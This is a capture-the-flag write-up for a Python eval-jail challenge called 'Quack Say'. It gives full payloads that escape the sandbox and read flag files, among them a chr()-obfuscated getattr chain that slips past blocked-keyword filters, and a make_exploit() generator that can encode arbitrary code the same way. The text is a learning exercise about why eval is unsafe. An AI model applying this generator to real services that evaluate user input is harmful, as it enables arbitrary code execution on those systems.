# Quack Say

For `jail1.py` -

```
exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag1.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')
```

For `jail2.py` -

```
getattr(*(list(getattr(*(list(globals() for a in chr(1)) + list(chr(103)+chr(101)+chr(116) for a in chr(1))))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)) for a in chr(1)) + list(chr(101)+chr(118)+chr(97)+chr(108) for a in chr(1))))(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(39)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(44)+chr(32)+chr(115)+chr(121)+chr(115)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(115)+chr(121)+chr(115)+chr(46)+chr(95)+chr(95)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(95)+chr(95)+chr(59)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(50)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(102)+chr(108)+chr(97)+chr(103)+chr(41)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(111)+chr(115)+chr(46)+chr(100)+chr(101)+chr(118)+chr(110)+chr(117)+chr(108)+chr(108)+chr(44)+chr(32)+chr(34)+chr(119)+chr(34)+chr(41)+chr(39)+chr(41))
```

This was without a doubt the most gruelling problem of this set. I surely spent over 1 hour on `jail1.py` and maybe even 4-5 hours searching for different methods to solve `jail2.py`.

I had a few immediate observations on seeing the code.

First of all, the list of blocked words in `jail2.py` was a hint to solving `jail1.py`. 

The `eval()` function only computes expressions, but I wanted to run my own code. On Googling, I found that an `exec` statement could be used inside an `eval()`.

To get the required print output, I designed this piece of code -

```python
import os, sys
sys.stdout = sys.__stdout__
flag = open("flag1.txt").read()
print(flag)
sys.stdout = open(os.devnull, "w")
```

In brief, this code prints a text to the `default stdout`, then redirects the output of the `stdout` stream to `os.devnull` (trash). Hence, any more text will not be printed to the console.

Now, we just need to wrap an `exec()` function around this and we're done with `jail1.py`.

The next part was much more difficult.

On exploring internet, I first found the `compile()` function which compiles python source code into AST objects. I assumed that if I somehow could export this output into a string, it would not contain any part of the cleartext (original code), and I would successfully be able to pass it as input.

However, I was unable to get around this problem. I found [this](https://stackoverflow.com/questions/71510595/serialize-python-code-object-from-compile) question on StackExchange looking for exactly what I wanted, but was unsolved.

I started with another approach. The `eval()` function accepts a string, whose encoding I thought I could manipulate. I started searching for various encoding streams of `string.encode()` in python, which would scramble my cleartext to make it pass.

Again, I was stuck trying to find one such encoding and left this approach.

At this point I had spent atleast 2-3h reading articles on [Python Bytecode](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d), [compile()](https://docs.python.org/3/library/functions.html#compile) and [eval()](https://medium.com/techtofreedom/the-eval-function-in-python-a-powerful-but-dangerous-weapon-ba44e39fa9e2) without much success.

One common thing I notices in most of these articles was that the `eval()` function is quite insecure, and even simple checks (like making sure the expression does not delete system files, or doesn't modify variables) are readily exploitable.

I started searching more on this and came across [this](https://stackoverflow.com/questions/3513292/python-make-eval-safe) answer on Stack.

```
> are eval's security issues fixable or are there just too many tiny details to get it working right?

Definitely the latter -- a clever hacker will always manage to find a way around your precautions.
``` 

I then searched for some of these exploits and came across 3-4 of them - using `pyparsing`, `ast`, `binascii` and `getattr + ord`.

To avoid importing anything, I looked more into the `getattr + ord` exploit and came across [**this**](https://stackoverflow.com/questions/13066594/is-there-a-way-to-secure-strings-for-pythons-eval) answer on Stack which was basically it.

The exploit -

```python
def to_chrs(text):
    return '+'.join('chr(%d)' % ord(c) for c in text)

def _make_getattr_call(obj, attr):
    return 'getattr(*(list(%s for a in chr(1)) + list(%s for a in chr(1))))' % (obj, attr)

def make_exploit(code):
    get = to_chrs('get')
    builtins = to_chrs('__builtins__')
    eval = to_chrs('eval')
    code = to_chrs(code)
    return (_make_getattr_call(
                _make_getattr_call('globals()', '{get}') + '({builtins})',
                '{eval}') + '({code})').format(**locals())
```

Using `make_exploit()` on the code 

```
exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag2.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')
```
we finally generate a looooooooong input which does pass `file2.py` and we are done.

The final commands are -

```bash
satyankar@Satyankars-MacBook-Air Quack_Say % python3 solve.py 1
exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag1.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')
satyankar@Satyankars-MacBook-Air Quack_Say % python3 solve.py 2
getattr(*(list(getattr(*(list(globals() for a in chr(1)) + list(chr(103)+chr(101)+chr(116) for a in chr(1))))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)) for a in chr(1)) + list(chr(101)+chr(118)+chr(97)+chr(108) for a in chr(1))))(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(39)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(44)+chr(32)+chr(115)+chr(121)+chr(115)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(115)+chr(121)+chr(115)+chr(46)+chr(95)+chr(95)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(95)+chr(95)+chr(59)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(50)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(102)+chr(108)+chr(97)+chr(103)+chr(41)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(111)+chr(115)+chr(46)+chr(100)+chr(101)+chr(118)+chr(110)+chr(117)+chr(108)+chr(108)+chr(44)+chr(32)+chr(34)+chr(119)+chr(34)+chr(41)+chr(39)+chr(41))
```

~~command for file2 doesn't fit in my terminal stdin lol and has to be sent via redirection.~~